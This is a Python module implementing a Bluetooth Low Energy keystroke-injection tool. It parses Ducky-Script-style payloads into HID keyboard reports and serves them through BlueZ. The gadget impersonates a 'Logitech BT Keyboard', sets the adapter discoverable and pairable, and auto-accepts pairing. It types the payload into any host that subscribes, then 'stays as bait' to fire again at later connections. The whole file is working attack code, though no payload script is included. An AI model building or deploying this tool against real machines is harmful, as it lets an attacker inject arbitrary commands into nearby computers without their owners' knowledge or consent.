from __future__ import annotations

import asyncio
from dataclasses import dataclass, field

HID_SERVICE = "00001812-0000-1000-8000-00805f9b34fb"
HID_INFO = "00002a4a-0000-1000-8000-00805f9b34fb"
REPORT_MAP = "00002a4b-0000-1000-8000-00805f9b34fb"
REPORT = "00002a4c-0000-1000-8000-00805f9b34fb"
HID_CONTROL_POINT = "00002a4d-0000-1000-8000-00805f9b34fb"
PROTOCOL_MODE = "00002a4e-0000-1000-8000-00805f9b34fb"
REPORT_REFERENCE = "00002908-0000-1000-8000-00805f9b34fb"

BOOT_KEYBOARD = bytes.fromhex(
    "05010906a101050719e029e715002501750195088102"
    "95017508810395057501050819012905910595017501"
    "9181057508950675010581950175082501650081c0"
)

HID_INFO_VALUE = bytes([0x01, 0x01, 0x00, 0x02])
PROTOCOL_REPORT_VALUE = bytes([0x01])

MOD_CTRL = 0x01
MOD_SHIFT = 0x02
MOD_ALT = 0x04
MOD_GUI = 0x08
MOD_RCTRL = 0x10
MOD_RSHIFT = 0x20
MOD_RALT = 0x40
MOD_RGUI = 0x80

KEY_NONE = 0x00
KEY_A = 0x04
KEY_ENTER = 0x28
KEY_ESC = 0x29
KEY_BACKSPACE = 0x2A
KEY_TAB = 0x2B
KEY_SPACE = 0x2C
KEY_DELETE = 0x4C

SINGLE_KEYS = {
    "ENTER": KEY_ENTER,
    "ESC": KEY_ESC,
    "ESCAPE": KEY_ESC,
    "BACKSPACE": KEY_BACKSPACE,
    "TAB": KEY_TAB,
    "SPACE": KEY_SPACE,
    "DELETE": KEY_DELETE,
    "UPARROW": 0x52,
    "DOWNARROW": 0x51,
    "LEFTARROW": 0x50,
    "RIGHTARROW": 0x4F,
    "CAPSLOCK": 0x39,
    "HOME": 0x4A,
    "END": 0x4D,
    "PAGEUP": 0x4B,
    "PAGEDOWN": 0x4E,
    "INSERT": 0x49,
    "PRINTSCREEN": 0x46,
    "PAUSE": 0x48,
    "F1": 0x3A,
    "F2": 0x3B,
    "F3": 0x3C,
    "F4": 0x3D,
    "F5": 0x3E,
    "F6": 0x3F,
    "F7": 0x40,
    "F8": 0x41,
    "F9": 0x42,
    "F10": 0x43,
    "F11": 0x44,
    "F12": 0x45,
}

MODIFIER_KEYS = {
    "CTRL": MOD_CTRL,
    "LCTRL": MOD_CTRL,
    "RCTRL": MOD_RCTRL,
    "SHIFT": MOD_SHIFT,
    "LSHIFT": MOD_SHIFT,
    "RSHIFT": MOD_RSHIFT,
    "ALT": MOD_ALT,
    "LALT": MOD_ALT,
    "RALT": MOD_RALT,
    "GUI": MOD_GUI,
    "WIN": MOD_GUI,
    "META": MOD_GUI,
    "MAGIC": MOD_GUI,
    "RGUI": MOD_RGUI,
}

Action = tuple[bytes | None, float]


def _usage(char: str) -> tuple[int, int]:
    if char.isalpha():
        base = KEY_A + (ord(char.lower()) - 0x61)
        return base, MOD_SHIFT if char.isupper() else 0
    if char.isdigit():
        return 0x1E + (ord(char) - 0x30), 0
    mapping = {
        "\n": (KEY_ENTER, 0),
        "\r": (KEY_ENTER, 0),
        " ": (KEY_SPACE, 0),
        "\t": (KEY_TAB, 0),
        ".": (0x37, 0),
        ",": (0x36, 0),
        ";": (0x33, 0),
        "'": (0x34, 0),
        "/": (0x38, 0),
        "\\": (0x64, 0),
        "-": (0x2D, 0),
        "=": (0x2E, 0),
        "`": (0x35, 0),
        "[": (0x2F, 0),
        "]": (0x30, 0),
        "!": (0x1E, MOD_SHIFT),
        "@": (0x1F, MOD_SHIFT),
        "#": (0x20, MOD_SHIFT),
        "$": (0x21, MOD_SHIFT),
        "%": (0x22, MOD_SHIFT),
        "^": (0x23, MOD_SHIFT),
        "&": (0x24, MOD_SHIFT),
        "*": (0x25, MOD_SHIFT),
        "(": (0x26, MOD_SHIFT),
        ")": (0x27, MOD_SHIFT),
        "_": (0x2D, MOD_SHIFT),
        "+": (0x2E, MOD_SHIFT),
        "{": (0x2F, MOD_SHIFT),
        "}": (0x30, MOD_SHIFT),
        ":": (0x33, MOD_SHIFT),
        '"': (0x34, MOD_SHIFT),
        "<": (0x36, MOD_SHIFT),
        ">": (0x37, MOD_SHIFT),
        "?": (0x38, MOD_SHIFT),
        "~": (0x35, MOD_SHIFT),
        "|": (0x64, MOD_SHIFT),
    }
    return mapping.get(char, (KEY_NONE, 0))


def _report(mods: int, usage: int) -> bytes:
    return bytes([mods, 0, usage, 0, 0, 0, 0, 0])


def _empty_report() -> bytes:
    return bytes(8)


def _key_events(mods: int, usage: int, interval: float, hold: float) -> list[Action]:
    return [
        (_report(mods, usage), hold),
        (_empty_report(), interval),
    ]


def _line_events(line: str, interval: float, hold: float) -> list[Action]:
    stripped = line.strip()
    if not stripped or stripped.upper().startswith("REM"):
        return []
    upper = stripped.upper()
    if upper.startswith("DELAY"):
        parts = stripped.split()
        if len(parts) < 2 or not parts[1].isdigit():
            raise ValueError(f"bad DELAY: {line!r}")
        return [(None, int(parts[1]) / 1000.0)]
    if upper.startswith("STRING"):
        return _string_events(stripped.split(None, 1)[1], interval, hold)

    tokens = stripped.split()
    upper_tokens = [t.upper() for t in tokens]
    if any(t in MODIFIER_KEYS for t in upper_tokens):
        mods = 0
        usage = KEY_NONE
        for t, ut in zip(tokens, upper_tokens):
            if ut in MODIFIER_KEYS:
                mods |= MODIFIER_KEYS[ut]
            elif ut in SINGLE_KEYS:
                usage = SINGLE_KEYS[ut]
            elif len(t) == 1:
                usage, _ = _usage(t)
            else:
                raise ValueError(f"bad modifier combo: {line!r}")
        if usage == KEY_NONE:
            raise ValueError(f"combo without key: {line!r}")
        return _key_events(mods, usage, interval, hold)
    if len(tokens) == 1 and upper in SINGLE_KEYS:
        return _key_events(0, SINGLE_KEYS[upper], interval, hold)
    return _string_events(stripped, interval, hold)


def _string_events(text: str, interval: float, hold: float) -> list[Action]:
    events: list[Action] = []
    for char in text:
        usage, shift = _usage(char)
        events.extend(_key_events(shift, usage, interval, hold))
    return events


def parse_payload(text: str, interval: float = 0.01, hold: float = 0.02) -> list[Action]:
    events: list[Action] = []
    for line in text.splitlines():
        events.extend(_line_events(line, interval, hold))
    return events


def estimate_duration(actions: list[Action]) -> float:
    return sum(wait for _, wait in actions)


def count_keystrokes(actions: list[Action]) -> int:
    return sum(1 for report, _ in actions if report is not None) // 2


@dataclass
class HidReport:
    text: str
    interval: float = 0.01
    hold: float = 0.02
    reports: list[bytes] = field(default_factory=list, init=False)

    def __post_init__(self) -> None:
        for _, report in self.actions():
            if report is not None:
                self.reports.append(report)

    def actions(self) -> list[Action]:
        return parse_payload(self.text, self.interval, self.hold)


def script_reports(script: str, interval: float = 0.01, hold: float = 0.02) -> list[bytes]:
    return [report for report, _ in parse_payload(script, interval, hold) if report is not None]


def describe_payload(actions: list[Action]) -> str:
    keys = count_keystrokes(actions)
    total = estimate_duration(actions)
    return f"{keys} key states, ~{total * 1000:.0f} ms total"


class BluezHidGadget:
    def __init__(self, name: str = "Logitech BT Keyboard", appearance: int = 0x03C1) -> None:
        self.name = name
        self.appearance = appearance

    def run(
        self,
        actions: list[Action],
        timeout: float = 120.0,
        interval: float = 0.01,
        countdown: float = 0.0,
        max_fires: int = 1,
        on_state=None,
    ) -> int:
        if on_state is None:
            on_state = lambda _msg: None

        try:
            from bluez_peripheral.advert import Advertisement
            from bluez_peripheral.agent import NoIoAgent
            from bluez_peripheral.gatt.characteristic import (
                CharacteristicFlags,
                characteristic,
            )
            from bluez_peripheral.gatt.descriptor import DescriptorFlags, descriptor
            from bluez_peripheral.gatt.service import Service, ServiceCollection
            from bluez_peripheral.util import Adapter, get_message_bus
        except ImportError as exc:
            raise RuntimeError(
                "'bluez-peripheral' is required for BLE HID: pip install bluez-peripheral"
            ) from exc

        class HidService(Service):
            def __init__(self) -> None:
                super().__init__(HID_SERVICE, True)
                self.report.getter_func = (
                    lambda service, options, c=self.report: bytes(c._value) or bytes(8)
                )
                self.report.setter_func = (
                    lambda service, data, options: None
                )
                self.report_reference.getter_func = (
                    lambda service, options, v=bytes([0x01, 0x01]): v
                )

            hid_info = characteristic(HID_INFO, CharacteristicFlags.READ)
            report_map = characteristic(REPORT_MAP, CharacteristicFlags.READ)
            report = characteristic(
                REPORT,
                CharacteristicFlags.READ
                | CharacteristicFlags.NOTIFY
                | CharacteristicFlags.WRITE_WITHOUT_RESPONSE,
            )
            protocol_mode = characteristic(
                PROTOCOL_MODE,
                CharacteristicFlags.READ | CharacteristicFlags.WRITE_WITHOUT_RESPONSE,
            )
            control_point = characteristic(
                HID_CONTROL_POINT, CharacteristicFlags.WRITE_WITHOUT_RESPONSE
            )
            report_reference = descriptor(
                REPORT_REFERENCE, report, DescriptorFlags.READ
            )

        async def _set_flag(bus, iface, flag: str, value: bool) -> None:
            from dbus_next import Variant
            from dbus_next.message import Message

            try:
                setter = getattr(iface, "set_" + flag.lower())
                await setter(value)
                return
            except AttributeError:
                pass
            reply = await bus.call(
                Message(
                    destination="org.bluez",
                    path=iface.path,
                    interface="org.freedesktop.DBus.Properties",
                    member="Set",
                    signature="ssv",
                    body=["org.bluez.Adapter1", flag, Variant("b", value)],
                )
            )
            if reply.message_type == "error":
                raise RuntimeError(reply.body[0])

        async def run_async() -> int:
            bus = await get_message_bus()
            adapter = await Adapter.get_first(bus)
            await adapter.set_powered(True)
            on_state("power-on")

            iface = adapter._proxy.get_interface("org.bluez.Adapter1")
            await _set_flag(bus, iface, "Discoverable", True)
            await _set_flag(bus, iface, "Pairable", True)
            if self.name:
                await adapter.set_alias(self.name)

            hid_service = HidService()
            collection = ServiceCollection([hid_service])
            await collection.register(bus, path="/org/bthj/hid", adapter=adapter)
            on_state(f"gatt-registered: {HID_SERVICE}")

            advert = Advertisement(
                self.name or "Bluetooth Keyboard",
                [HID_SERVICE],
                self.appearance,
                timeout=int(timeout) + 60,
            )
            await advert.register(bus, adapter=adapter, path="/org/bthj/hid/advert0")
            on_state(f"advertising as '{self.name or 'Bluetooth Keyboard'}'")

            agent = NoIoAgent()
            await agent.register(bus, default=True, path="/org/bthj/hid/agent")
            on_state("pairing agent ready (auto-accept)")

            loop = asyncio.get_event_loop()
            deadline = loop.time() + timeout
            fires = 0
            sent_total = 0
            while max_fires < 0 or fires < max_fires:
                while not hid_service.report._notify:
                    if loop.time() >= deadline:
                        if fires == 0:
                            raise TimeoutError("no client connected and subscribed in time")
                        return sent_total
                    await asyncio.sleep(0.2)
                if fires == 0:
                    on_state("client connected and subscribed")
                else:
                    on_state("client re-associated, firing again")

                remaining = countdown
                while remaining > 0:
                    on_state(f"firing in {remaining:.0f}s")
                    await asyncio.sleep(1.0)
                    remaining -= 1.0

                for report, wait in actions:
                    if report is not None:
                        hid_service.report._value = bytearray(report)
                        hid_service.report.changed(report)
                        sent_total += 1
                    await asyncio.sleep(max(wait, 0.001))
                fires += 1
                on_state(f"fired (#{fires}), {sent_total} reports total")

                while hid_service.report._notify:
                    if loop.time() >= deadline:
                        return sent_total
                    await asyncio.sleep(0.3)
                if max_fires < 0 or fires < max_fires:
                    on_state("client left, staying as bait")

            on_state("payload complete")
            return sent_total

        try:
            return asyncio.run(run_async())
        except TimeoutError as exc:
            raise RuntimeError(str(exc)) from exc